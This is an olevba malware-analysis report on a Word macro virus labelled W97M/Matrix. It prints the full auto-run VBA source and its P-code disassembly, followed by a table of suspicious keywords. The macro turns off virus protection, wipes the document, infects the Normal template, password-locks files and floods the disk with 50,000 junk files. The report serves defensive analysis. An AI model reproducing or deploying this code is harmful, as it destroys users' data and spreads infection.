olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Matrix
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Matrix - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    On Error Resume Next
    Dim b, mfm, fn, mi, ma, cfn
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        With Options
            .VirusProtection = (Rnd * 0)
            .SaveNormalPrompt = (Rnd * 0)
            .ConfirmConversions = (Rnd * 0)
            .SavePropertiesPrompt = (Rnd * 0)
            .BlueScreen = (Rnd * 0) + 1
        End With
        CommandBars("Tools").Controls("Macro").Enabled = (Rnd * 0)
        CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = (Rnd * 0)
        CommandBars("Format").Controls("Style Gallery...").Enabled = (Rnd * 0)
        With Application
            .Caption = "Micro$oft Matrix"
            .UserName = "Total Konfuzion"
            .UserInitials = "TK"
            .UserAddress = "W97M/Matrix" & vbCr & "The Matrix has you."
        End With
        With Selection
            .HomeKey Unit:=wdStory
            .EndKey Unit:=wdStory, Extend:=wdExtend
            .Delete Unit:=wdCharacter, Count:=1
            .ParagraphFormat.Alignment = wdAlignParagraphCenter
            .Font.Name = "Arial"
            .Font.Bold = (Rnd * 0) + 1
            .Font.Size = 20
            .Font.Animation = wdAnimationShimmer
            .TypeText Text:="The Matrix has you."
            For b = 1 To 7
                .TypeParagraph
            Next b
            .Font.Bold = (Rnd * 0)
            .Font.Italic = (Rnd * 0) + 1
            .Font.Size = 8
            .Font.Animation = wdAnimationNone
            .TypeText Text:="Follow the white rabbit."
            .Font.Italic = (Rnd * 0)
            For b = 1 To 3
                .TypeParagraph
            Next b
            .Font.Bold = (Rnd * 0) + 1
            .TypeText Text:="()...()"
            .TypeParagraph
            .TypeText Text:="( ' = ' )"
            .TypeParagraph
            .TypeText Text:="(''')(''')"
        End With
        Selection.HomeKey Unit:=wdStory
        If ThisDocument = ActiveDocument Then Set i = NormalTemplate Else Set i = ActiveDocument
        Vx = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
        Set d = i.VBProject.VBComponents.Item(1).CodeModule
        d.DeleteLines 1, d.CountOfLines
        d.AddFromString Vx
        With ActiveDocument
            .ReadOnlyRecommended = (Rnd * 0) + 1
            .Password = "ashley"
            .WritePassword = "ashley"
        End If
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
        mfn = (Rnd * 0)
        fn = FreeFile
        For mi = 1 To 50000
            mfn = mfn + 1
            Open "C:\Windows\System\Matrix" & mfn & ".sys" For Output As #fn
                For ma = 1 To 100000
                    Print #fn, "The Matrix has you."
                Next ma
            Close #fn
        Next mi
    End If
' W97M/Matrix
'   by: Total Konfuzion
' Are YOU looking for it !!?
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Matrix
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5294 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Dim 
' 	VarDefn B
' 	VarDefn mfm
' 	VarDefn fn
' 	VarDefn mi
' 	VarDefn ma
' 	VarDefn cfn
' Line #3:
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0003 "MVP"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x001A "Enabled by Total Konfuzion"
' 	Ne 
' 	IfBlock 
' Line #4:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #5:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith VirusProtection 
' Line #6:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SaveNormalPrompt 
' Line #7:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith ConfirmConversions 
' Line #8:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemStWith SavePropertiesPrompt 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith BlueScreen 
' Line #10:
' 	EndWith 
' Line #11:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #12:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0018 "Templates and Add-ins..."
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitStr 0x0010 "Style Gallery..."
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #14:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #15:
' 	LitStr 0x0010 "Micro$oft Matrix"
' 	MemStWith Caption 
' Line #16:
' 	LitStr 0x000F "Total Konfuzion"
' 	MemStWith UserName 
' Line #17:
' 	LitStr 0x0002 "TK"
' 	MemStWith UserInitials 
' Line #18:
' 	LitStr 0x000B "W97M/Matrix"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "The Matrix has you."
' 	Concat 
' 	MemStWith UserAddress 
' Line #19:
' 	EndWith 
' Line #20:
' 	StartWithExpr 
' 	Ld Selection 
' 	With 
' Line #21:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	ArgsMemCallWith HomeKey 0x0001 
' Line #22:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld wdExtend 
' 	ParamNamed Extend 
' 	ArgsMemCallWith EndKey 0x0002 
' Line #23:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	ArgsMemCallWith Delete 0x0002 
' Line #24:
' 	Ld wdAlignParagraphCenter 
' 	MemLdWith ParagraphFormat 
' 	MemSt Alignment 
' Line #25:
' 	LitStr 0x0005 "Arial"
' 	MemLdWith Font 
' 	MemSt New 
' Line #26:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #27:
' 	LitDI2 0x0014 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #28:
' 	Ld wdAnimationShimmer 
' 	MemLdWith Font 
' 	MemSt Animation 
' Line #29:
' 	LitStr 0x0013 "The Matrix has you."
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #30:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0007 
' 	For 
' Line #31:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #32:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #34:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #35:
' 	LitDI2 0x0008 
' 	MemLdWith Font 
' 	MemSt Size 
' Line #36:
' 	Ld wdAnimationNone 
' 	MemLdWith Font 
' 	MemSt Animation 
' Line #37:
' 	LitStr 0x0018 "Follow the white rabbit."
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #38:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	MemLdWith Font 
' 	MemSt Italic 
' Line #39:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	For 
' Line #40:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #41:
' 	StartForVariable 
' 	Ld B 
' 	EndForVariable 
' 	NextVar 
' Line #42:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemLdWith Font 
' 	MemSt Bold 
' Line #43:
' 	LitStr 0x0007 "()...()"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #44:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #45:
' 	LitStr 0x0009 "( ' = ' )"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #46:
' 	ArgsMemCallWith TypeParagraph 0x0000 
' Line #47:
' 	LitStr 0x000A "(''')(''')"
' 	ParamNamed Then 
' 	ArgsMemCallWith TypeText 0x0001 
' Line #48:
' 	EndWith 
' Line #49:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall HomeKey 0x0001 
' Line #50:
' 	Ld ThisDocument 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set i 
' 	Else 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set i 
' 	EndIf 
' Line #51:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Vx 
' Line #52:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld i 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	Set d 
' Line #53:
' 	LitDI2 0x0001 
' 	Ld d 
' 	MemLd CountOfLines 
' 	Ld d 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #54:
' 	Ld Vx 
' 	Ld d 
' 	ArgsMemCall AddFromString 0x0001 
' Line #55:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #56:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	MemStWith ReadOnlyRecommended 
' Line #57:
' 	LitStr 0x0006 "ashley"
' 	MemStWith Password 
' Line #58:
' 	LitStr 0x0006 "ashley"
' 	MemStWith WritePassword 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #61:
' 	Ld Rnd 
' 	LitDI2 0x0000 
' 	Mul 
' 	Paren 
' 	St mfn 
' Line #62:
' 	Ld Friend 
' 	St fn 
' Line #63:
' 	StartForVariable 
' 	Ld mi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0xC350 0x0000 
' 	For 
' Line #64:
' 	Ld mfn 
' 	LitDI2 0x0001 
' 	Add 
' 	St mfn 
' Line #65:
' 	LitStr 0x0018 "C:\Windows\System\Matrix"
' 	Ld mfn 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	Ld fn 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #66:
' 	StartForVariable 
' 	Ld ma 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x86A0 0x0001 
' 	For 
' Line #67:
' 	Ld fn 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "The Matrix has you."
' 	PrintItemNL 
' Line #68:
' 	StartForVariable 
' 	Ld ma 
' 	EndForVariable 
' 	NextVar 
' Line #69:
' 	Ld fn 
' 	Sharp 
' 	Close 0x0001 
' Line #70:
' 	StartForVariable 
' 	Ld mi 
' 	EndForVariable 
' 	NextVar 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	QuoteRem 0x0000 0x000C " W97M/Matrix"
' Line #73:
' 	QuoteRem 0x0000 0x0016 "   by: Total Konfuzion"
' Line #74:
' 	QuoteRem 0x0000 0x001B " Are YOU looking for it !!?"
' Line #75:
' 	EndSub 
' Line #76:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

